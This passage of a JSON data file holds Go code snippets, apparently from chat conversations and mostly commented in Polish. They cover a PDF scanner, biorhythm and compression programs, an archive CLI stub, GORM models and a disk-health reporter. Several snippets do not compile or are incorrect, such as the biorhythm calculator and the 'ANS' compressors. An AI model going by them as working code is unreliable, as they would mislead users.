    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc main() {\n\troot := \"C:/\"\n\n\tpdfFiles := []string{}\n\n\terr := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n\t\tif !info.IsDir() && strings.ToLower(filepath.Ext(path)) == \".pdf\" {\n\t\t\tpdfFiles = append(pdfFiles, path)\n\t\t}\n\t\treturn nil\n\t})\n\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Znaleziono\", len(pdfFiles), \"plików PDF\")\n\n\ttotalSize := int64(0)\n\tfor _, file := range pdfFiles {\n\t\tfileInfo, err := os.Stat(file)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t\ttotalSize += fileInfo.Size()\n\t}\n\n\tfmt.Println(\"Całkowity rozmiar plików PDF:\", formatSize(totalSize))\n\n\tfile, err := os.Create(\"wynik.txt\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\t_, err = file.WriteString(fmt.Sprintf(\"Znaleziono %d plików PDF\\n\", len(pdfFiles)))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t_, err = file.WriteString(fmt.Sprintf(\"Całkowity rozmiar plików PDF: %s\\n\", formatSize(totalSize)))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Pomyślnie zapisano wynik do pliku wynik.txt\")\n}\n\n// Funkcja formatująca rozmiar pliku w czytelny sposób\nfunc formatSize(size int64) string {\n\tconst unit = 1024\n\tif size < unit {\n\t\treturn fmt.Sprintf(\"%d B\", size)\n\t}\n\tdiv, exp := int64(unit), 0\n\tfor n := size / unit; n >= unit; n /= unit {\n\t\tdiv *= unit\n\t\texp++\n\t}\n\treturn fmt.Sprintf(\"%.1f %cB\", float64(size)/float64(div), \"KMGTPE\"[exp])\n}",
    "filename": "29eb8015cbcd20bea56c751bc98cabd9_0.go"
  },
  {
    "conversation_hash": "6de53024be8cf22d9f3911e26958bae2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\ntype Biorhythm struct {\n\tPhysical   float64\n\tEmotional  float64\n\tIntellectual float64\n}\n\nfunc calculateBiorhythms(days int) []Biorhythm {\n\tbiorhythms := make([]Biorhythm, days)\n\n\tfor i := 0; i < days; i++ {\n\t\tt := time.Now().AddDate(0, 0, i)\n\t\tdaysSinceBirth := t.Sub(birthDate).Hours() / 24\n\n\t\tphysical := 50 * (1 + math.Sin(2*math.Pi*daysSinceBirth/23))\n\t\temotional := 50 * (1 + math.Sin(2*math.Pi*daysSinceBirth/28))\n\t\tintellectual := 50 * (1 + math.Sin(2*math.Pi*daysSinceBirth/33))\n\n\t\tbiorhythms[i] = Biorhythm{\n\t\t\tPhysical:   physical,\n\t\t\tEmotional:  emotional,\n\t\t\tIntellectual: intellectual,\n\t\t}\n\t}\n\n\treturn biorhythms\n}\n\nfunc main() {\n\tvar birthDate time.Time\n\n\tfmt.Println(\"Podaj datę urodzenia (w formacie RRRR-MM-DD): \")\n\t_, err := fmt.Scanf(\"%s\", &birthDate)\n\tif err != nil {\n\t\tfmt.Println(\"Wprowadzono nieprawidłowy format daty.\")\n\t\treturn\n\t}\n\n\tweekBiorhythms := calculateBiorhythms(7)\n\tmonthBiorhythms := calculateBiorhythms(30)\n\n\tfmt.Println(\"\\nBiorytmy na cały tydzień:\")\n\tfor i, b := range weekBiorhythms {\n\t\tfmt.Printf(\"Dzień %d: Fizyczny - %.2f%%, Emocjonalny - %.2f%%, Intelektualny - %.2f%%\\n\", i+1, b.Physical, b.Emotional, b.Intellectual)\n\t}\n\n\tfmt.Println(\"\\nBiorytmy na cały miesiąc:\")\n\tfor i, b := range monthBiorhythms {\n\t\tfmt.Printf(\"Dzień %d: Fizyczny - %.2f%%, Emocjonalny - %.2f%%, Intelektualny - %.2f%%\\n\", i+1, b.Physical, b.Emotional, b.Intellectual)\n\t}\n}",
    "filename": "6de53024be8cf22d9f3911e26958bae2_0.go"
  },
  {
    "conversation_hash": "a8db455e09934e996d37a4d899d1f29f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\ntype pair struct {\n\toffset int\n\tlength int\n\tnext   byte\n}\n\nfunc compress(text string) []pair {\n\tpairs := []pair{}\n\tbuffer := text\n\tfor len(buffer) > 0 {\n\t\toffset, length, next := findLongestMatch(buffer, text)\n\t\tpairs = append(pairs, pair{offset, length, next})\n\t\tbuffer = buffer[length:]\n\t}\n\treturn pairs\n}\n\nfunc findLongestMatch(buffer, text string) (int, int, byte) {\n\tmaxLength := 0\n\tmaxOffset := 0\n\tmaxNext := byte(0)\n\tfor i := 0; i < len(buffer); i++ {\n\t\tfor j := 0; j < len(text); j++ {\n\t\t\tif buffer[i] == text[j] {\n\t\t\t\tlength := 0\n\t\t\t\tfor i+length < len(buffer) && j+length < len(text) && buffer[i+length] == text[j+length] {\n\t\t\t\t\tlength++\n\t\t\t\t}\n\t\t\t\tif length > maxLength {\n\t\t\t\t\tmaxLength = length\n\t\t\t\t\tmaxOffset = j\n\t\t\t\t\tif i+length < len(buffer) {\n\t\t\t\t\t\tmaxNext = buffer[i+length]\n\t\t\t\t\t} else {\n\t\t\t\t\t\tmaxNext = 0\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn maxOffset, maxLength, maxNext\n}\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\tfmt.Print(\"Enter text to compress: \")\n\ttext, _ := reader.ReadString('\\n')\n\ttext = strings.TrimSuffix(text, \"\\n\")\n\tcompressedPairs := compress(text)\n\tfmt.Println(compressedPairs)\n}",
    "filename": "a8db455e09934e996d37a4d899d1f29f_0.go"
  },
  {
    "conversation_hash": "47d060fb14eb472083beca3f19330a65",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n    \"os\"\n    \"strings\"\n)\n\nfunc main() {\n    // Wczytaj plik ARj do pamięci\n    data, err := ioutil.ReadFile(\"ARj.txt\")\n    if err != nil {\n        fmt.Println(\"Błąd odczytu pliku ARj:\", err)\n        os.Exit(1)\n    }\n\n    // Zamień znaki CRLF na LF\n    content := strings.ReplaceAll(string(data), \"\\r\\n\", \"\\n\")\n\n    // Zapisz unowocześnioną wersję programu ARj do pliku\n    err = ioutil.WriteFile(\"ARj_modern.txt\", []byte(content), 0644)\n    if err != nil {\n        fmt.Println(\"Błąd zapisu do pliku ARj_modern.txt:\", err)\n        os.Exit(1)\n    }\n\n    fmt.Println(\"Unowocześniony program ARj został zapisany do pliku ARj_modern.txt.\")\n}",
    "filename": "47d060fb14eb472083beca3f19330a65_0.go"
  },
  {
    "conversation_hash": "47d060fb14eb472083beca3f19330a65",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"compress/gzip\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Otwórz plik ARj do odczytu\n\tinputFile, err := os.Open(\"ARj.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd odczytu pliku ARj:\", err)\n\t\tos.Exit(1)\n\t}\n\tdefer inputFile.Close()\n\n\t// Utwórz plik gzip do zapisu\n\toutputFile, err := os.Create(\"ARj_gzipped.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd utworzenia pliku ARj_gzipped.txt:\", err)\n\t\tos.Exit(1)\n\t}\n\tdefer outputFile.Close()\n\n\t// Skompresuj plik ARj do formatu gzip\n\tgzipWriter := gzip.NewWriter(outputFile)\n\tdefer gzipWriter.Close()\n\n\t// Skopiuj treść pliku ARj do pliku ARj_gzipped.txt przy użyciu kompresji gzip\n\t_, err = io.Copy(gzipWriter, inputFile)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd kopiowania danych:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Println(\"Unowocześniona wersja programu ARj została skompresowana do formatu gzip i zapisana do pliku ARj_gzipped.txt.\")\n}",
    "filename": "47d060fb14eb472083beca3f19330a65_1.go"
  },
  {
    "conversation_hash": "6eaf91cdd3fae58de8972ed9556bace0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n)\n\nfunc main() {\n\tport := os.Getenv(\"PORT\")\n\tif port == \"\" {\n\t\tport = \"8080\"\n\t}\n\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Hello, World!\")\n\t})\n\n\tlog.Printf(\"Server listening on port %s\", port)\n\tlog.Fatal(http.ListenAndServe(\":\"+port, nil))\n}",
    "filename": "6eaf91cdd3fae58de8972ed9556bace0_0.go"
  },
  {
    "conversation_hash": "c7d16f80b2fd6b85f35bc2f3f19af073",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "archive"
    ],
    "code": "package main\n\nimport (\n\t\"compress/lzw\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n)\n\nfunc main() {\n\taddFlag := flag.Bool(\"a\", false, \"Add file to archive\")\n\tdeleteFlag := flag.Bool(\"d\", false, \"Delete file from archive\")\n\tselfExtractingFlag := flag.Bool(\"s\", false, \"Make a self-extracting archive\")\n\tupdateFlag := flag.Bool(\"u\", false, \"Update file to archive\")\n\tmoveFlag := flag.Bool(\"m\", false, \"Move new file into archive\")\n\textractFlag := flag.Bool(\"e\", false, \"Extract files from archive\")\n\textractFlag2 := flag.Bool(\"x\", false, \"Extract files from archive\") // Using naming convention e,x for extract\n\tlistFlag := flag.Bool(\"l\", false, \"View list of files in archive\")\n\ttestFlag := flag.Bool(\"t\", false, \"Test integrity of archive\")\n\thelpFlag := flag.Bool(\"h\", false, \"View help screen\")\n\n\tflag.Parse()\n\n\tif *addFlag {\n\t\tfmt.Println(\"Add file to archive\")\n\t\t// Add file to archive logic here\n\t} else if *deleteFlag {\n\t\tfmt.Println(\"Delete file from archive\")\n\t\t// Delete file from archive logic here\n\t} else if *selfExtractingFlag {\n\t\tfmt.Println(\"Make a self-extracting archive\")\n\t\t// Make a self-extracting archive logic here\n\t} else if *updateFlag {\n\t\tfmt.Println(\"Update file to archive\")\n\t\t// Update file to archive logic here\n\t} else if *moveFlag {\n\t\tfmt.Println(\"Move new file into archive\")\n\t\t// Move new file into archive logic here\n\t} else if *extractFlag || *extractFlag2 {\n\t\tfmt.Println(\"Extract files from archive\")\n\t\t// Extract files from archive logic here\n\t} else if *listFlag {\n\t\tfmt.Println(\"View list of files in archive\")\n\t\t// View list of files in archive logic here\n\t} else if *testFlag {\n\t\tfmt.Println(\"Test integrity of archive\")\n\t\t// Test integrity of archive logic here\n\t} else if *helpFlag {\n\t\tprintHelp()\n\t} else {\n\t\tfmt.Println(\"No valid flag provided. Use -h flag for help.\")\n\t}\n}\n\nfunc printHelp() {\n\tfmt.Println(\"Help:\")\n\tfmt.Println(\"-a: Add file to archive\")\n\tfmt.Println(\"-d: Delete file from archive\")\n\tfmt.Println(\"-s: Make a self-extracting archive\")\n\tfmt.Println(\"-u: Update file to archive\")\n\tfmt.Println(\"-m: Move new file into archive\")\n\tfmt.Println(\"-e, -x: Extract files from archive\")\n\tfmt.Println(\"-l: View list of files in archive\")\n\tfmt.Println(\"-t: Test integrity of archive\")\n\tfmt.Println(\"-h: View help screen\")\n}",
    "filename": "c7d16f80b2fd6b85f35bc2f3f19af073_0.go"
  },
  {
    "conversation_hash": "c7d16f80b2fd6b85f35bc2f3f19af073",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "archive"
    ],
    "code": "package main\n\nimport (\n\t\"compress/lzw\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n)\n\nfunc main() {\n\taddFlag := flag.Bool(\"a\", false, \"Add file to archive\")\n\tdeleteFlag := flag.Bool(\"d\", false, \"Delete file from archive\")\n\tselfExtractingFlag := flag.Bool(\"s\", false, \"Make a self-extracting archive\")\n\tupdateFlag := flag.Bool(\"u\", false, \"Update file to archive\")\n\tmoveFlag := flag.Bool(\"m\", false, \"Move new file into archive\")\n\textractFlag := flag.Bool(\"e\", false, \"Extract files from archive\")\n\textractFlag2 := flag.Bool(\"x\", false, \"Extract files from archive\") // Using naming convention e,x for extract\n\tlistFlag := flag.Bool(\"l\", false, \"View list of files in archive\")\n\ttestFlag := flag.Bool(\"t\", false, \"Test integrity of archive\")\n\thelpFlag := flag.Bool(\"h\", false, \"View help screen\")\n\n\tflag.Parse()\n\n\tif *addFlag {\n\t\tfmt.Println(\"Add file to archive\")\n\t\t// Add file to archive logic here\n\t} else if *deleteFlag {\n\t\tfmt.Println(\"Delete file from archive\")\n\t\t// Delete file from archive logic here\n\t} else if *selfExtractingFlag {\n\t\tfmt.Println(\"Make a self-extracting archive\")\n\t\t// Make a self-extracting archive logic here\n\t} else if *updateFlag {\n\t\tfmt.Println(\"Update file to archive\")\n\t\t// Update file to archive logic here\n\t} else if *moveFlag {\n\t\tfmt.Println(\"Move new file into archive\")\n\t\t// Move new file into archive logic here\n\t} else if *extractFlag || *extractFlag2 {\n\t\tfmt.Println(\"Extract files from archive\")\n\t\t// Extract files from archive logic here\n\t} else if *listFlag {\n\t\tfmt.Println(\"View list of files in archive\")\n\t\t// View list of files in archive logic here\n\t} else if *testFlag {\n\t\tfmt.Println(\"Test integrity of archive\")\n\t\t// Test integrity of archive logic here\n\t} else if *helpFlag {\n\t\tprintHelp()\n\t} else {\n\t\tfmt.Println(\"No valid flag provided. Use -h flag for help.\")\n\t}\n}\n\nfunc printHelp() {\n\tfmt.Println(\"Help:\")\n\tfmt.Println(\"-a: Add file to archive\")\n\tfmt.Println(\"-d: Delete file from archive\")\n\tfmt.Println(\"-s: Make a self-extracting archive\")\n\tfmt.Println(\"-u: Update file to archive\")\n\tfmt.Println(\"-m: Move new file into archive\")\n\tfmt.Println(\"-e, -x: Extract files from archive\")\n\tfmt.Println(\"-l: View list of files in archive\")\n\tfmt.Println(\"-t: Test integrity of archive\")\n\tfmt.Println(\"-h: View help screen\")\n}\n\nfunc addFileToArchive(file string) {\n\tarchiveFile, err := os.Create(\"archive.lzw\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating archive file:\", err)\n\t\treturn\n\t}\n\tdefer archiveFile.Close()\n\n\tarchiveWriter := lzw.NewWriter(archiveFile, lzw.LSB, 8)\n\tdefer archiveWriter.Close()\n\n\tfileToArchive, err := os.Open(file)\n\tif err != nil {\n\t\tfmt.Println(\"Error opening file:\", err)\n\t\treturn\n\t}\n\tdefer fileToArchive.Close()\n\n\t_, err = io.Copy(archiveWriter, fileToArchive)\n\tif err != nil {\n\t\tfmt.Println(\"Error copying file to archive:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"File added to archive successfully\")\n}\n\nfunc extractFilesFromArchive() {\n\tarchiveFile, err := os.Open(\"archive.lzw\")\n\tif err != nil {\n\t\tfmt.Println(\"Error opening archive file:\", err)\n\t\treturn\n\t}\n\tdefer archiveFile.Close()\n\n\tarchiveReader := lzw.NewReader(archiveFile, lzw.LSB, 8)\n\tdefer archiveReader.Close()\n\n\t_, err = io.Copy(os.Stdout, archiveReader)\n\tif err != nil {\n\t\tfmt.Println(\"Error extracting files from archive:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Files extracted from archive successfully\")\n}",
    "filename": "c7d16f80b2fd6b85f35bc2f3f19af073_1.go"
  },
  {
    "conversation_hash": "cd746459d0eb8f6811c95fc219966f9f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\ntype ANSCompressor struct {\n\tmodel        map[string]int\n\talphabetSize int\n}\n\nfunc NewANSCompressor() *ANSCompressor {\n\treturn &ANSCompressor{\n\t\tmodel:        make(map[string]int),\n\t\talphabetSize: 256, // rozmiar alfabetu dla kodowania tekstu jako bajty\n\t}\n}\n\nfunc (c *ANSCompressor) Compress(text string) (compressed []int) {\n\tsymbols := strings.Split(text, \"\") // konwertowanie tekstu na pojedyncze symbole (bajty)\n\t\n\tfrequencies := make([]int, c.alphabetSize)\n\tfor _, symbol := range symbols {\n\t\tfrequencies[symbol[0]]++\n\t}\n\t\n\tstarts := make([]int, c.alphabetSize)\n\tends := make([]int, c.alphabetSize)\n\t\n\tsum := 0\n\tfor i, freq := range frequencies {\n\t\tstarts[i] = sum\n\t\tends[i] = sum + freq\n\t\tsum += freq\n\t}\n\t\n\tfor _, symbol := range symbols {\n\t\tcompressed = append(compressed, starts[symbol[0]], ends[symbol[0]])\n\t}\n\t\n\treturn compressed\n}\n\nfunc (c *ANSCompressor) Decompress(compressed []int) string {\n\ttext := \"\"\n\t\n\tfrequencies := make([]int, c.alphabetSize)\n\tfor i := 0; i < len(compressed); i += 2 {\n\t\tfrequencies[compressed[i]]++\n\t}\n\t\n\tstarts := make([]int, c.alphabetSize)\n\tends := make([]int, c.alphabetSize)\n\t\n\tsum := 0\n\tfor i, freq := range frequencies {\n\t\tstarts[i] = sum\n\t\tends[i] = sum + freq\n\t\tsum += freq\n\t}\n\t\n\tfor i := 1; i < len(compressed); i += 2 {\n\t\tsymbol := \"\"\n\t\tfor j := range starts {\n\t\t\tif compressed[i] >= starts[j] && compressed[i] < ends[j] {\n\t\t\t\tsymbol = string(j)\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\ttext += symbol\n\t}\n\t\n\treturn text\n}\n\nfunc main() {\n\tcompressor := NewANSCompressor()\n\n\ttext := \"Ala ma kota\"\n\tcompressed := compressor.Compress(text)\n\tfmt.Println(compressed)\n\n\tdecompressed := compressor.Decompress(compressed)\n\tfmt.Println(decompressed)\n}",
    "filename": "cd746459d0eb8f6811c95fc219966f9f_0.go"
  },
  {
    "conversation_hash": "cd746459d0eb8f6811c95fc219966f9f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"strings\"\n)\n\ntype ANSCompressor struct {\n\tmodel        map[string]int\n\talphabetSize int\n}\n\nfunc NewANSCompressor() *ANSCompressor {\n\treturn &ANSCompressor{\n\t\tmodel:        make(map[string]int),\n\t\talphabetSize: 256, // rozmiar alfabetu dla kodowania tekstu jako bajty\n\t}\n}\n\nfunc (c *ANSCompressor) Compress(text string) (compressed []int) {\n\tsymbols := strings.Split(text, \"\") // konwertowanie tekstu na pojedyncze symbole (bajty)\n\n\tfrequencies := make([]int, c.alphabetSize)\n\tfor _, symbol := range symbols {\n\t\tfrequencies[symbol[0]]++\n\t}\n\n\tstarts := make([]int, c.alphabetSize)\n\tends := make([]int, c.alphabetSize)\n\n\tsum := 0\n\tfor i, freq := range frequencies {\n\t\tstarts[i] = sum\n\t\tends[i] = sum + freq\n\t\tsum += freq\n\t}\n\n\tfor _, symbol := range symbols {\n\t\tcompressed = append(compressed, starts[symbol[0]], ends[symbol[0]])\n\t}\n\n\treturn compressed\n}\n\nfunc (c *ANSCompressor) Decompress(compressed []int) string {\n\ttext := \"\"\n\n\tfrequencies := make([]int, c.alphabetSize)\n\tfor i := 0; i < len(compressed); i += 2 {\n\t\tfrequencies[compressed[i]]++\n\t}\n\n\tstarts := make([]int, c.alphabetSize)\n\tends := make([]int, c.alphabetSize)\n\n\tsum := 0\n\tfor i, freq := range frequencies {\n\t\tstarts[i] = sum\n\t\tends[i] = sum + freq\n\t\tsum += freq\n\t}\n\n\tfor i := 1; i < len(compressed); i += 2 {\n\t\tsymbol := \"\"\n\t\tfor j := range starts {\n\t\t\tif compressed[i] >= starts[j] && compressed[i] < ends[j] {\n\t\t\t\tsymbol = string(j)\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\ttext += symbol\n\t}\n\n\treturn text\n}\n\nfunc main() {\n\tcompressor := NewANSCompressor()\n\n\t// Wczytywanie ścieżki pliku wejściowego z argumentów wiersza poleceń\n\tif len(os.Args) < 3 {\n\t\tfmt.Println(\"Podaj plik wejściowy i plik wyjściowy jako argumenty\")\n\t\treturn\n\t}\n\n\tinputPath := os.Args[1]\n\toutputPath := os.Args[2]\n\n\t// Wczytywanie zawartości pliku wejściowego\n\tinputContent, err := ioutil.ReadFile(inputPath)\n\tif err != nil {\n\t\tfmt.Println(\"Nie udało się wczytać pliku wejściowego:\", err)\n\t\treturn\n\t}\n\n\t// Kompresja tekstu z pliku wejściowego\n\tcompressed := compressor.Compress(string(inputContent))\n\n\t// Zapisywanie skompresowanej zawartości do pliku wyjściowego\n\toutputFile, err := os.Create(outputPath)\n\tif err != nil {\n\t\tfmt.Println(\"Nie udało się utworzyć pliku wyjściowego:\", err)\n\t\treturn\n\t}\n\tdefer outputFile.Close()\n\n\twriter := bufio.NewWriter(outputFile)\n\tfor _, value := range compressed {\n\t\t_, err = writer.WriteString(fmt.Sprintf(\"%d\\n\", value))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas zapisywania do pliku wyjściowego:\", err)\n\t\t\treturn\n\t\t}\n\t}\n\twriter.Flush()\n\n\tfmt.Println(\"Kompresja zakończona. Zapisano skompresowaną wersję do pliku:\", outputPath)\n\n\t// Dekompresja skompresowanej zawartości\n\tdecompressed := compressor.Decompress(compressed)\n\n\t// Zapisywanie zdekompresowanej zawartości do pliku wyjściowego\n\tdecompressedFilePath := strings.TrimSuffix(outputPath, \".compressed\") + \".decompressed\"\n\terr = ioutil.WriteFile(decompressedFilePath, []byte(decompressed), 0644)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas zapisywania zdekompresowanej zawartości do pliku:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Dekompresja zakończona. Zapisano zdekompresowany tekst do pliku:\", decompressedFilePath)\n}",
    "filename": "cd746459d0eb8f6811c95fc219966f9f_1.go"
  },
  {
    "conversation_hash": "5500a8d7e9313c49794f6e3575096ebb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\n// Implementacja algorytmu ANS dla kompresji\nfunc compress(input string) string {\n\tfrequencies := calculateFrequencies(input)\n\tcumulativeFreq := calculateCumulativeFrequencies(frequencies)\n\tmaxFrequency := findMaxFrequency(frequencies)\n\n\tscale := uint64(1 << 32) / maxFrequency\n\n\tstate := uint64(0)\n\tlow := uint64(0)\n\thigh := uint64(1<<32 - 1)\n\tcompressed := []string{}\n\n\tfor _, char := range input {\n\t\tfrequency := frequencies[char]\n\t\tlow = state + cumulativeFreq[char]*scale\n\t\thigh = state + (cumulativeFreq[char]+frequency)*scale - 1\n\t\tstate = low\n\n\t\tnormalizedLow := uint32(low) >> 16\n\t\tnormalizedHigh := uint32(high) >> 16\n\n\t\tfor normalizedLow^normalizedHigh < 0x8000 {\n\t\t\tcompressed = append(compressed, string(normalizedLow>>8))\n\t\t\tnormalizedLow = (normalizedLow & 0xFF) << 8\n\t\t\tnormalizedHigh = ((normalizedHigh & 0xFF) << 8) | 0xFF\n\t\t}\n\t}\n\n\tcolumns := 0\n\tbuffer := \"\"\n\n\tfor _, str := range compressed {\n\t\tbuffer += str\n\t\tcolumns++\n\n\t\tif columns > 20 {\n\t\t\tfmt.Println(buffer)\n\t\t\tcolumns = 0\n\t\t\tbuffer = \"\"\n\t\t}\n\t}\n\n\treturn buffer\n}\n\n// Implementacja algorytmu ANS dla dekompresji\nfunc decompress(compressed string) string {\n\tfrequencies := calculateFrequencies(compressed)\n\tcumulativeFreq := calculateCumulativeFrequencies(frequencies)\n\n\tscale := uint64(1 << 32) / findMaxFrequency(frequencies)\n\n\tstate := uint64(0)\n\tlow := uint64(0)\n\thigh := uint64(1<<32 - 1)\n\n\tdecompressed := []rune{}\n\n\tfor i := 0; i < len(compressed); i++ {\n\t\tchar := compressed[i]\n\t\tfrequency := frequencies[char]\n\n\t\tlow = state\n\t\thigh = state + (cumulativeFreq[char]+frequency)*scale - 1\n\n\t\tvalue := uint32((high - low + 1) >> 17)\n\n\t\tstate = low + uint64(value<<16)\n\t\tdecompressed = append(decompressed, rune(value))\n\n\t\tif state > high {\n\t\t\tstate--\n\t\t}\n\t}\n\n\treturn string(decompressed)\n}\n\n// Funkcja pomocnicza do obliczania częstotliwości występowania znaków w tekście\nfunc calculateFrequencies(text string) map[rune]int {\n\tfrequencies := make(map[rune]int)\n\n\tfor _, char := range text {\n\t\tfrequencies[char]++\n\t}\n\n\treturn frequencies\n}\n\n// Funkcja pomocnicza do obliczania skumulowanych częstotliwości znaków\nfunc calculateCumulativeFrequencies(frequencies map[rune]int) map[rune]int {\n\tcumulativeFreq := make(map[rune]int)\n\tcumulative := 0\n\n\tfor char, frequency := range frequencies {\n\t\tcumulativeFreq[char] = cumulative\n\t\tcumulative += frequency\n\t}\n\n\treturn cumulativeFreq\n}\n\n// Funkcja pomocnicza do znalezienia maksymalnej częstotliwości występowania znaków w tekście\nfunc findMaxFrequency(frequencies map[rune]int) int {\n\tmaxFrequency := 0\n\n\tfor _, frequency := range frequencies {\n\t\tif frequency > maxFrequency {\n\t\t\tmaxFrequency = frequency\n\t\t}\n\t}\n\n\treturn maxFrequency\n}\n\nfunc main() {\n\tinput := \"Lorem ipsum dolor sit amet, consectetur adipiscing elit.\"\n\n\tcompressed := compress(input)\n\tdecompressed := decompress(compressed)\n\n\tfmt.Println(\"Tekst wejściowy:\", input)\n\tfmt.Println(\"Kompresja ANS:\", compressed)\n\tfmt.Println(\"Dekompresja ANS:\", decompressed)\n}",
    "filename": "5500a8d7e9313c49794f6e3575096ebb_0.go"
  },
  {
    "conversation_hash": "6581830e6860a2b3e363568056ba414e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"time\"\n\n// Модель таблицы \"устройства\"\ntype Device struct {\n    Uuid         string `gorm:\"primaryKey\"`\n    SerialNumber string `gorm:\"not null\"`\n    Comments     string\n}\n\n// Модель таблицы \"события\"\ntype Event struct {\n    Uuid       string `gorm:\"primaryKey\"`\n    EventType  string `gorm:\"not null\"`\n    DateTime   time.Time `gorm:\"not null\"`\n    Comments   string\n}\n\n// Модель таблицы \"привязки\"\ntype Binding struct {\n    Uuid           string `gorm:\"primaryKey\"`\n    DeviceUuid     string `gorm:\"not null\"`\n    BoundDeviceUuid string `gorm:\"not null\"`\n    DateTime       time.Time `gorm:\"not null\"`\n    IsBound        bool `gorm:\"not null\"`\n    Comments       string\n}",
    "filename": "6581830e6860a2b3e363568056ba414e_2.go"
  },
  {
    "conversation_hash": "6581830e6860a2b3e363568056ba414e",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"gorm.io/driver/mysql\"\n    \"gorm.io/gorm\"\n)\n\nfunc main() {\n    // Подключение к базе данных\n    dsn := \"user:password@tcp(host:port)/database?charset=utf8mb4&parseTime=True&loc=Local\"\n    db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})\n    if err != nil {\n        panic(\"Failed to connect to database\")\n    }\n\n    // Создание таблиц в базе данных\n    db.AutoMigrate(&Device{}, &Event{}, &Binding{})\n}",
    "filename": "6581830e6860a2b3e363568056ba414e_3.go"
  },
  {
    "conversation_hash": "08f987247b0c1217d6f8d4df16af5885",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"strings\"\n)\n\nfunc main() {\n    // Wywołanie polecenia 'lsblk' w terminalu\n    cmd := exec.Command(\"lsblk\", \"-o\", \"NAME,SIZE,TYPE\")\n    out, err := cmd.Output()\n    if err != nil {\n        fmt.Println(\"Błąd podczas wywoływania polecenia 'lsblk':\", err)\n        os.Exit(1)\n    }\n\n    // Wypisanie otrzymanych danych\n    fmt.Println(\"Dyski twardy:\")\n    disks := strings.Split(string(out), \"\\n\")\n    for _, disk := range disks {\n        if !strings.Contains(disk, \"disk\") {\n            continue\n        }\n        disk = strings.TrimSpace(disk)\n        fmt.Println(\"Nazwa:\", strings.Fields(disk)[0])\n        fmt.Println(\"Rozmiar:\", strings.Fields(disk)[1])\n        \n        // Wywołanie polecenia 'smartctl' w terminalu\n        smartCmd := exec.Command(\"smartctl\", \"-H\", \"/dev/\"+strings.Fields(disk)[0])\n        smartOut, err := smartCmd.Output()\n        if err != nil {\n            fmt.Println(\"Błąd podczas wywoływania polecenia 'smartctl':\", err)\n            os.Exit(1)\n        }\n        fmt.Println(\"Informacje SMART:\")\n        fmt.Println(string(smartOut))\n        \n        fmt.Println(\"-------------------------\")\n    }\n}",
    "filename": "08f987247b0c1217d6f8d4df16af5885_0.go"
  },
  {
    "conversation_hash": "88c0f6562c17065fa0bb3b5b970219d2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\n// Function declaration\nfunc add(x int, y int) int {\n\treturn x + y\n}\n\nfunc main() {\n\tresult := add(5, 3)\n\tfmt.Println(result) // Output: 8\n}",
    "filename": "88c0f6562c17065fa0bb3b5b970219d2_0.go"
  },
  {
    "conversation_hash": "747026f0b8c07f9861466300085d4200",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
